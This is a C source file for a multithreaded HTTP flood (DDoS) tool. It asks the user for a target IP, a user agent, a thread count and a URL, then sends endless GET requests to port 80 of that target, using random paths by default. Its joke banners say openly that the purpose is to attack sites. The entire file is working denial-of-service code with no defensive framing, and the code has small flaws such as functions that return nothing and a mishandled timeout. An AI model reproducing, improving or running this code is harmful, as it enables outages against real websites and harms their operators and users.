#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define RESET "\x1b[0;0m"

char motd[10][124];
char ip[16]; 
char useragent[64]; 
int contentlength;
int specific = 0;
char url[64];
struct sockaddr_in sa;
int outputreq;
int outputres;
struct timeval tv;
char colors[6][32];

int makereq(char *req) {
 if(specific == 1) { 
  sprintf(req, "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n", url, ip, useragent);
 } else {
  char urlrand[8]; 
  for(int i = 0; i < 8; i++) {
   urlrand[i] = rand() % (0x7b - 0x61) + 0x61; 
  }
  sprintf(req, "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n", urlrand, ip, useragent);
 }
}

void *ddog(void *unused) {
 char *req = malloc(2048); 
 makereq(req); 
 int fd = socket(AF_INET, SOCK_STREAM, 0);
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); 
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); 
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL); 
  if(outputreq == 1) {
   dprintf(1, "Request: \n%s\n", req); 
  }
  if(outputres == 1) {
   char *resp = malloc(1024); 
   recv(fd, resp, 1024, 0); 
   dprintf(1, "Response: \n%s\n", resp); 
   free(resp);
  }
 }
 close(fd); 
 free(req); 
}

int threadmaker(int threads) {
 pthread_t thread[threads]; 
 while(1) { 
  for(int i = 0; i < threads; i++) {
   pthread_create(&thread[i], 0, &ddog, 0); 
  }
  for(int i = 0; i < threads; i++) {
   pthread_join(thread[i], 0);
  }
 }
}

int makesa() {
 sa.sin_addr.s_addr = inet_addr(ip);
 sa.sin_port = htons(80); 
 sa.sin_family = AF_INET;
}

int removenew(char *string) {
 if(strstr(string, "\n")) {
  char *newl =  strstr(string, "\n"); 
  newl[0] = 0; 
 }
}

int startit() {
 int threads;
 int b = rand() % (6 - 0) + 0;
 int r = rand() % (10 - 0) + 0;
 dprintf(1, "%s%s%s", colors[b], motd[r], RESET); 
 dprintf(1, "ip to ddos: ");
 read(1, ip, 16); 
 removenew(ip);
 makesa();
 dprintf(1, "User agent: ");
 read(1, useragent, 64);
 removenew(useragent);  
 dprintf(1, "Threads: "); 
 scanf("%d", &threads); 
 dprintf(1, "Specific url or random(1/0): ");
 scanf("%d", &specific);
 if(specific == 1) { 
  dprintf(1, "url: ");
  read(1, url, 64); 
  removenew(url);
 }
 dprintf(1, "Output requests?(1/0): "); 
 scanf("%d", &outputreq);
 dprintf(1, "Output response?(1/0): ");
 scanf("%d", &outputres); 
 if(outputres == 1 || outputreq == 1) {
  dprintf(1, "Warning: turning on output will slow down the requests considerably.\n");
 }
 int timeout;
 dprintf(1, "Send/receive timeout in miliseconds: ");
 scanf("%d", &timeout); 
 tv.tv_usec = timeout;
 dprintf(1, "Started.");
 threadmaker(threads);
}

int makemotd() {
 strcpy(motd[0], "Ddos what a terrible thing to do!\n");
 strcpy(motd[1], "What if your grandma was watching tsk tsk\n");
 strcpy(motd[2], "FREEZE FBI!!!\n");
 strcpy(motd[3], "Your mom gei\n");
 strcpy(motd[4], "Chakal is the greatest coder that ever lived\n");
 strcpy(motd[5], "Hail satan!\n");
 strcpy(motd[6], "AAAH STOP BOTHERING ME!!!\n");
 strcpy(motd[7], "You know what they say, if you can't hake it ddogs it!\n");
 strcpy(motd[8], "Just sqlmap the charpage u noob\n");
 strcpy(motd[9], "Yes.\n");
}

int makecolors() {
 strcpy(colors[0], "\x1b[31;1m");
 strcpy(colors[1], "\x1b[32;1m");
 strcpy(colors[2], "\x1b[33;1m");
 strcpy(colors[3], "\x1b[34;1m");
 strcpy(colors[4], "\x1b[35;1m");
 strcpy(colors[5], "\x1b[36;1m");
}

int main(int argc, char **argv) {
 system("clear");
 makecolors();
 makemotd();
 srand(time(0));
 startit();
}